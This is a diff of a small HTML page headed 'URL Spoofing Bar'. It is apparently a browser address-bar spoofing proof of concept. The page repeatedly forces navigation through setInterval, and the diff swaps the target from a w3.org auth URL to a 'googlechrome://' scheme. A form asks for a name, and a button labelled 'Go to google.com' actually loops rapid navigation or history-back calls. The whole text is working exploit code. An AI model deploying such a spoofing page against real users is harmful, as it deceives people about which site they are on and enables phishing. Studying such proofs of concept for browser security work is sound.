@@ -1,17 +1,15 @@
 
-
 <html>
 <body>
 
 <script>
-                v = setInterval(`x=document.location='https://jigsaw.w3.org/HTTP/Basic/';`);        
-
+                v = setInterval(`x=document.location='googlechrome://about:about';`);        
 </script>
         </h1>URL Spoofing Bar</h1>
 <form action="https://www.w3schools.com/tags/action_page.php">
         
 Enter your name: <input type="text" name="firstname" value=""><br>
 </form> 
-        <input onclick="setInterval(function(){document.location='googlechrome://about:about';}, 30);" type="button" value="Go to google.com" />
+        <input onclick="setInterval(function(){window.history.go(-1);}, 30);" type="button" value="Go to google.com" />
 </body>
 </html>
